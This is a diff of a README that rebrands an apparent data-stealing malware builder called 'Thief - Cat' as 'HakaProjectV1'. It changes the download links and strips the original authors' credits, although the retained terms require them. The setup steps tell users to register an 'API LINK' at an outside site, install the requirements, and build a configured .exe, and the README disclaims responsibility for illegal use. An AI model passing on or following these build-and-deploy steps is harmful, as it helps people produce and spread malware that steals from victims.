@@ -1,6 +1,6 @@
 
 <h1 align="center">
-  Thief - Cat v8 🐱
+  HakaProjectV1 🐱
 </h1>
 
 
@@ -8,15 +8,6 @@
 
 ![](https://www.dailymotion.com/video/k6j06fNNLxmYiHzbTHU)
 
-
-
-# API URL = hawkish.eu click on the video on the top to see how to create it (in 30sec max)
-[![SHOWCASE](https://s1.dmcdn.net/v/U_gzM1aWFvjGrFaU3/x240)](https://dai.ly/k6j06fNNLxmYiHzbTHU)
-
-
-
-
-##### [Join for premium](https://t.me/Sordeal)
 
 
 ## <a id="content"></a>🌐 〢 Content
@@ -34,9 +25,9 @@
 ## <a id="setup"></a> 🐱 〢 Setting up
 0. Create your API LINK here https://hawkish.eu/
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
-2. Install [Files](https://github.com/KSCH-58/Thief-Cat/archive/refs/heads/main.zip)
-3. Install all requirements [install.bat](https://github.com/KSCH-58/Thief-Cat/blob/main/install.bat)
-4. Click on start.bat [start.bat](https://github.com/KSCH-58/Thief-Cat/blob/main/start.bat)
+2. Install [Files](https://github.com/Hokaliz/HokaProjet/archive/refs/heads/main.zip)
+3. Install all requirements [install.bat]
+4. Click on HokaProjectV1
 5. Complete the configuration
 6. You have your .exe/.py file enjoy
 
@@ -44,8 +35,7 @@
 
 
 ## <a id="features"></a>🐱 〢 Features
-### 💲 = premium join telegram ( Nova Sentinel )
-# [JOIN TELEGRAM CHANNEL](https://t.me/Sordeal)
+
 
 ```diff
 > Default:
@@ -293,13 +283,7 @@ v9: 2023-07-07 script:
 - [x] Reselling is forbidden
 - [x] You can use the source code if you keep credits (in embed + in markdown), it has to be open-source
 - [x] We are NOT responsible of anything you do with our software (if its illegal)
-- [x] If Any Antivirus/Browsers want to know how to patch some vuln you can send me an mail
-
-
-### Authors
-- [KSCH](https://github.com/KSCH-58)
-- [Nolay](https://github.com/NolayDscd)
-- [M4T](https://github.com/M4Tback)
+- [x] If Any Antivirus/Browsers want to know how to patch some vuln you can send me an main
 
 
 
